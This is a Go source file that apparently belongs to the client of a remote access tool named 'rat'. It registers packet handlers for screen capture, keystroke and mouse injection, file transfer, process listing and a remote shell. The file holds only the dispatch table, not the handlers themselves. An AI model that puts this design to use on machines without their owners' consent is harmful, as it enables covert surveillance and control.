package main

import (
	"rat/client/network/header"
)

type PacketMap map[header.PacketHeader]IncomingPacket

var packets PacketMap

func init() {
	packets = make(PacketMap)
	packets[header.PingHeader] = PingPacket{}
	packets[header.SysHeader] = SysPacket{}
	packets[header.ScreenHeader] = ScreenPacket{}
	packets[header.ProcessHeader] = ProcessPacket{}
	packets[header.DirectoryHeader] = DirectoryPacket{}
	packets[header.PutFileHeader] = DownloadPacket{}
	packets[header.GetFileHeader] = UploadPacket{}
	packets[header.MouseMoveHeader] = MouseMovePacket{}
	packets[header.MouseHeader] = MousePacket{}
	packets[header.KeyHeader] = KeyPacket{}
	packets[header.FileHeader] = FilePacket{}
	packets[header.ShellHeader] = ShellPacket{}
	packets[header.WindowsHeader] = WindowsPacket{}
}

func GetIncomingPacket(header header.PacketHeader) IncomingPacket {
	return packets[header]
}
